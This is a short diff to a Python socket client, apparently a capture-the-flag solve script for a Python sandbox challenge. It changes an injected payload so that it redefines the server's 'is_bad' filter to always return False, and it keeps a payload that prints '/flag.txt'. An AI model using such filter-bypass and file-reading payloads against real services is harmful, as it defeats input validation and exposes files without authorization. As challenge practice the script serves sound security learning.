@@ -14,7 +14,7 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
 	print("Feedback from server: ", feedback)
 
 	# Run your Python code and save the output to a variable
-	payload = b"exec(input())"
+	payload = b"global is_bad; is_bad = lambda string: False; main()"
 
 	# Send the output to the server
 	s.sendall(payload)
@@ -22,6 +22,11 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
 	ret = "\n"
 	
 	s.sendall(ret.encode())
+
+	# Receive feedback from the server
+	data = s.recv(1024)
+	feedback = data.decode()
+	print("Feedback from server: ", feedback)
 
 	# Run your Python code and save the output to a variable
 	payload = b"print(open('/flag.txt').read())"
